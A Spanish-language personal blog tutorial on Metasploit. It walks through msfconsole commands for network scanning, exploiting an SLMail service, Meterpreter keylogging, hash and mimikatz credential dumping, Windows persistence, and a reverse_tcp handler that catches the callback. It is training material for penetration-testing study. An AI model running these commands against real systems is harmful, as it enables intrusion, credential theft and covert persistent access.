---
title: Metasploit
date: 2023-09-20
categories: [Linux, Cajón de Herramientas]
tags: [Metaexploit]
image:
  path: ../../assets/img/Linux/CajonHerramientas/metasploit.jpg
  width: 528
  height: 340
  alt: Banner Metasploit
---

Agradecimientos a Marcelo Vázquez conocido también como s4vitar. Parte de los conocimientos los he recogido de sus videos y de la academia.

## ¿Qué puede hacer?

Metasploit es una herramienta muy poderosa que permite explotar las vulnerabilidades de seguridad de los sistemas informáticos.

Con metaexploit puedes hacer de todo:  
+ Escanear y recopilar información sobre una máquina de destino.
+ Detectar y explotar vulnerabilidades.
+ Aumentar los privilegios de un sistema operativo.
+ Instalar una puerta trasera para mantener el acceso persistente.
+ Utilizar la técnica "Fuzzing" para probar la solidez del software.

## Ejemplo de uso 

En el post de buffer overflow vimos como explotar esta vulnerabilidad manualmente. Esta vez veremos como hacerlo con metaexploit.

Abrimos metaexploit, se puede de dos formas:
```sh
> msfdb run #Si es la primera vez tendrás que hacerlo si o si de esta manera.

> msfconsole
```
> La ruta donde se aloja metaexploit suele ser /usr/share/metaexploit-framework/

Dentro de metaexploit podemos asignarnos un espacio de trabajo, ayuda a trabajar de manera más organizada, en ese espacio de trabajo se guardarían las variables(puertos y hosts) que guardes despúes.
```sh
> workspace # Para listar los espacios de trabajo. Nos saldrá el espacio de trabajo "default"

# Para añadir un nuevo espacio de trabajo:
> workspace -a espacioGuille1
# Ahora tendremos dos.

> workspace espacioGuille1 # Cambiaríamos de espacio de trabajo.
```
Ejemplo de uso:
```sh
> search arp # Nos encontrará varios modulos que contengan arp.
# Una vez elegido cual utilizar, por ejemplo; /auxiliary/scanner/discovery/arp_sweep
> use /auxiliary/scanner/discovery/arp_sweep # Nos metemos en el marco del exploit. 

> show options # listar opciones. En la columna Required saldrán los requeridos.

> info # Para buscar algo más de información sobre lo que hace el exploit.

> set RHOSTS 192.168.1.0/24 # Establecemos algunas de las variables requeridas. En el caso /24 porque lo haremos a la red.
> run # Ejecutamos el exploit. Es lo mismo que hacer arp-scan -I ens33 --localnet. Nos saldrían los host de la red.

> hosts # Nos listaría de manera más organizada el resultado anterior de los hosts.
```
Puedes lanzar un nmap tambíen de los puertos más comunes desde metaexploit:
```sh
> db_nmap 192.168.1.5
```
Ahora, al igual que tienes el comando `searchsploit` para buscar vulnerabilidades en exploitdb, aquí tenemos el comando `search`.
```sh
> search slmail # Buscaremos vulnerabilidades asociadas al servicio slmail.

> use NAME_EXPLOIT  # Entramos en el marco del exploit.
```
> Si la columna check estuviera en "yes" podríamos lanzar un checker para comprobar si es vulnerable antes de lanzar el exploit. El comando es check.

```sh
> show options

> set RHOSTS 192.168.1.5 # Estableceriamos con set las variables requeridas.
```
Para mucho exploits aparte del exploit en sí hay que lanzarle un payload que dependerá de la máquina objetivo( si es linux o windows). Además con `show targets` podemos elegir que sistema operativo específico es:
```sh
> show targets # Muestra sistemas operativos disponibles como objetivo para ese exploit
> set target 2 # Por ejemplo, para elegir el número dos que te listara.
```
Respecto a los payloads te suele poner por defecto uno, pero para ver todos y elegir cual quieres:
```sh
> show payloads # Desde fuera de metaexploit es lo mismo que hacer msfvenom -l payloads
> set payload NOMBRE_PAYLOAD
```
> Meterpreter es un listener dentro de metaexploit. Como si fuera un netcat típico que conocemos pero en metaexploit.

Gracias al meterpreter ya no hace falta ponerse en escucha en una ventana aparte con nc. Vamos a ejecutar el exploit:
```sh
> exploit 
# Te pondría meterpreter session 1 opened. Ya estaríamos dentro de la máquina objetivo.
```
Una vez dentro hay comandos propios de meterpreter. Si hacemos un `help` los podemos ver, podríamos hacer una captura de pantalla, ver en tiempo real, bloquear el teclado de la víctima, etc. En máquinas virtuales algunos de estos comandos no funcionan.  
También hay otro comando para añadir un **keylogger**!.
```sh
> keyscan_start 
# Ahora estaríamos capturando lo que escribe en el teclado -keylogger-.
> keyscan_dump # Para recoger y visualizar esa info.

> hashdump # Para dumpear los hashes.

> load kiwi # Para cargar el mimikatz y después listar credenciales de la memoria. En este caso saldrían en texto claro.
> creds_all # Para obtener las credenciales de lo que pille.
```
Con `load -l` podemos ver las opciones que podemos cargar:
```sh
> load -l
```
Para tener una consola interactiva utilzamos el comando `shell` aunque la máquina víctima fuera una windows. Se podría usar `poweshell` para lo mismo:
```sh
> shell # También funciona para una Windows!!.

> powershell # o también powershell_shell
```
Puedes dejar la **sesión en segundo plano** así:
```sh
> background # La dejas en segundo plano.
> sessions # Verías las sesiones que tienes.
```
Hablemos de la **persitencia** es decir, garantizar que yo tenga acceso a la máquina en el fúturo. Fuera de la sesión, dejandola en segundo plano, podemos buscar por persistence:
```sh
> search persistence
> search persistence platform:"windows" # Para una búsqueda más específica.

> use exploit/windows/local/persistence_image_exec_options # por ejemplo. Entramos en el marco del exploit.
> show options
# una de las opciones que saldrán ese SESSION, setearemos la que teníamos en segundo plano.
> set SESSION 1 # Como LHOST y LPORT mi ip y puerto que quiera.
> run # Accedes de nuevo a la máquina y te crea una forma de ingresar de nuevo aunque salieras de la sesión, ya no segundo plano, si no saliendo.  
# Cada X tiempo te mandaría una consola, como una tarea cron. Así funciona la persistencia realmente.
> exit # para salir de la sesión.
> exit -y # para salir del metaexploit.

# Ahora podría volver a entrar:
> msfdb run

> use exploit/multi/handler # Nos creamos un listener -sesión de escucha-.
> show options
# veremos que requiere un payload, lo cargamos:
> set payload windows/meterpreter/reverse_tcp
> set LHOST MIIP # El puerto que coincida con el de la persistencia.

# Si hago un sessions no tendremos ya ninguna sesión activa peeero:
> sessions # No veremos nada.
> run # Hemos logrado acceso al sistema de nuevo.
```

Y hasta aquí lo aprendido de Metaexploit. Vuelvo a agradecer las clases de s4vitar y su academia. Si queréis saber más os dejo por aquí el enlace a su academia; [hack4u](https://hack4u.io/).